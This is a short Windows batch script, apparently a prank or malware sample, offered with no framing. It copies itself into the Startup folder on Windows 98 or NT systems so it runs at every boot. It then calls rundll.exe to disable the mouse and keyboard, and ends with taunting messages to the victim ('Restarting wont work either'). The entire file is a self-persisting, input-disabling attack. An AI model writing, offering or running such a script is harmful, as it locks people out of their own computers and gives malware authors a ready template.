@echo off
if exist C:\windows\Startm~1\Programs\StartUp\nul goto win98
if exist C:\winnt\Startm~1\Programs\StartUp\nul goto winnt
:win98
copy %0 c:\windows\startm~1\programs\startup
c:\windows\rundll.exe mouse,disable
c:\windows\rundll.exe keyboard,disable
goto end
:winnt
copy %0 C:\winnt\Startm~1\Programs\StartUp\
c:\windows\rundll.exe mouse,disable
c:\windows\rundll.exe keyboard,disable
goto end
:end
echo You cant stop me now!
echo Restarting wont work either I all ready took care of that!
echo Bahahahahahahahahahahahahaha your screwed!!!
exit 